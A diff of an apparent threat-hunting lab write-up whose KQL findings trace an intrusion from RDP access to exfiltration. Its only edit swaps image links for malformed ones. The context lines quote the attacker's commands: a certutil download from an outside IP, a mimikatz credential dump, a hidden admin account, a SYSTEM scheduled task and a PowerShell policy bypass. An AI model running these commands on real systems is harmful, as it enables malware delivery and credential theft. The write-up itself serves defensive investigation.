@@ -23,7 +23,7 @@ DeviceLogonEvents
 
 ```
 
-![Pasted image 20260114110900.png](Pasted_image_20260114110900.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260114110900.png](Pasted_image_20260114110900.png)
 
 Why this matters: Remote Desktop Protocol connections leave network traces that identify the source of unauthorized access. Determining the origin helps with threat actor attribution and blocking ongoing attacks.
 
@@ -48,7 +48,7 @@ DeviceLogonEvents
 
 ```
 
-![Pasted image 20260114112804.png](Pasted_image_20260114112804.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260114112804.png](Pasted_image_20260114112804.png)
 
 Why this matters: Identifying which credentials were compromised determines the scope of unauthorized access and guides remediation efforts including password resets and privilege reviews.
 
@@ -73,7 +73,7 @@ DeviceProcessEvents
 
 ```
 
-![Pasted image 20260114114438.png](Pasted_image_20260114114438.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260114114438.png](Pasted_image_20260114114438.png)
 
 Why this matters: Attackers enumerate network topology to identify lateral movement opportunities and high-value targets. This reconnaissance activity is a key indicator of advanced persistent threats.
 
@@ -98,7 +98,7 @@ DeviceProcessEvents
 
 ```
 
-![Pasted image 20260114123356.png](Pasted_image_20260114123356.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260114123356.png](Pasted_image_20260114123356.png)
 
 Why this matters: Attackers establish staging locations to organize tools and stolen data. Identifying these directories reveals the scope of compromise and helps locate additional malicious artefacts.
 
@@ -121,7 +121,7 @@ DeviceRegistryEvents
 
 ```
 
-![Pasted image 20260114130008.png](Pasted_image_20260114130008.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260114130008.png](Pasted_image_20260114130008.png)
 
 Why this matter: Attackers add file extension exclusions to Windows Defender to prevent scanning of malicious files. Counting these exclusions reveals the scope of the attacker's defense evasion strategy.
 
@@ -142,7 +142,7 @@ DeviceRegistryEvents
 
 ```
 
-![Pasted image 20260114221531.png](Pasted_image_20260114221531.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260114221531.png](Pasted_image_20260114221531.png)
 
 Why it matters: Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools. These exclusions allow malware to run undetected.
 
@@ -164,7 +164,7 @@ Findings:
 2025-11-19T19:07:21.0804181Z
 "certutil.exe" -urlcache -f [http://78.141.196.6:8080/AdobeGC.exe](http://78.141.196.6:8080/AdobeGC.exe) C:\ProgramData\WindowsCache\mm.exe
 
-![Pasted image 20260115102434.png](Pasted_image_20260115102434.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115102434.png](Pasted_image_20260115102434.png)
 
 Why this matters: Legitimate system utilities are often weaponized to download malware while evading detection. Identifying these techniques helps improve defensive controls
 
@@ -188,7 +188,7 @@ Findings:
 - Location/Name: "schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f
 - MITRE Technique: ID: T1053
 
-![Pasted image 20260115103350.png](Pasted_image_20260115103350.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115103350.png](Pasted_image_20260115103350.png)
 
 Why this matters: Scheduled tasks provide reliable persistence across system reboots. The task name often attempts to blend with legitimate Windows maintenance routines.
 
@@ -212,7 +212,7 @@ Findings:
 - Location/Name: C:\ProgramData\WindowsCache\svchost.exe
 - MITRE Technique: ID: T1053
 
-![Pasted image 20260115105616.png](Pasted_image_20260115105616.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115105616.png](Pasted_image_20260115105616.png)
 
 Why this matters: The scheduled task action defines what executes at runtime. This reveals the exact persistence mechanism and the malware location.
 
@@ -236,7 +236,7 @@ Findings:
 - C2 Port: 8080
 - MITRE Technique: TA0011
 
-![Pasted image 20260115114556.png](Pasted_image_20260115114556.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115114556.png](Pasted_image_20260115114556.png)
 
 Why this matters: Command and control infrastructure allows attackers to remotely control compromised systems. Identifying C2 servers enables network blocking and infrastructure tracking.
 
@@ -260,7 +260,7 @@ Findings:
 - C2 Port: 443? Why not 8080?
 - MITRE Technique: TA0011
 
-![Pasted image 20260115114556.png](Pasted_image_20260115114556%201.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115114556.png](Pasted_image_20260115114556%201.png)
 
 Why this matters: C2 communication ports can indicate the framework or protocol used. This information supports network detection rules and threat intelligence correlation.
 
@@ -280,7 +280,7 @@ DeviceFileEvents
 mm.exe
 T1003
 
-![Pasted image 20260115171116.png](Pasted_image_20260115171116.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115171116.png](Pasted_image_20260115171116.png)
 
 Why this matters: Credential dumping tools extract authentication secrets from system memory. These tools are typically renamed to avoid signature-based detection.
 
@@ -302,7 +302,7 @@ DeviceProcessEvents
 "mm.exe" privilege::debug sekurlsa::logonpasswords exit
 mm.exe
 
-![Pasted image 20260115172725.png](Pasted_image_20260115172725.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115172725.png](Pasted_image_20260115172725.png)
 
 Why this matters: Credential dumping tools use specific modules to extract passwords from security subsystems. Documenting the exact technique used aids in detection engineering.
 
@@ -324,7 +324,7 @@ DeviceFileEvents
 - Archive Name: C:\ProgramData\WindowsCache\export-data.zip
 - MITRE Technique: T1560.001
 
-![Pasted image 20260115173715.png](Pasted_image_20260115173715.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115173715.png](Pasted_image_20260115173715.png)
 
 Attackers compress stolen data for efficient exfiltration. The archive filename often includes dates or descriptive names for the attacker's organisation.
 
@@ -347,7 +347,7 @@ Discord
 162.159.135.232 Port 443
 T1567
 
-![Pasted image 20260115175400.png](Pasted_image_20260115175400.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115175400.png](Pasted_image_20260115175400.png)
 
 Why this matters: Cloud services with upload capabilities are frequently abused for data theft. Identifying the service helps with incident scope determination and potential data recovery.
 
@@ -369,7 +369,7 @@ DeviceProcessEvents
 Security Log Deletion
 T1070.001
 
-![Pasted image 20260115180639.png](Pasted_image_20260115180639.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115180639.png](Pasted_image_20260115180639.png)
 
 Clearing event logs destroys forensic evidence and impedes investigation efforts. The order of log clearing can indicate attacker priorities and sophistication.
 
@@ -391,7 +391,7 @@ net1.exe
 net1 localgroup Administrators support /add
 T1136.001
 
-![Pasted image 20260115182234.png](Pasted_image_20260115182234.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115182234.png](Pasted_image_20260115182234.png)
 
 Why this matters: Hidden administrator accounts provide alternative access for future operations. These accounts are often configured to avoid appearing in normal user interfaces.
 
@@ -412,7 +412,7 @@ wupdate.ps1
 powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1"
 T1059.001
 
-![Pasted image 20260115205145.png](Pasted_image_20260115205145.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115205145.png](Pasted_image_20260115205145.png)
 
 Why this matters: Attackers often use scripting languages to automate their attack chain. Identifying the initial attack script reveals the entry point and automation method used in the compromise.
 
@@ -437,7 +437,7 @@ DeviceProcessEvents
 T1550
 TA0008
 
-![Pasted image 20260115211020.png](Pasted_image_20260115211020.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115211020.png](Pasted_image_20260115211020.png)
 
 Why this matters: Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.
 
@@ -459,6 +459,6 @@ DeviceProcessEvents
 mstsc.exe
 T1021.001
 
-![Pasted image 20260115212010.png](Pasted_image_20260115212010.png)
+![](ExportBlock-cecabdab-b9f9-454c-8828-30d810684ffd-Part-1/Pasted image 20260115212010.png](Pasted_image_20260115212010.png)
 
 Why this matters: Built-in remote access tools are preferred for lateral movement as they blend with legitimate administrative activity. This technique is harder to detect than custom tools.
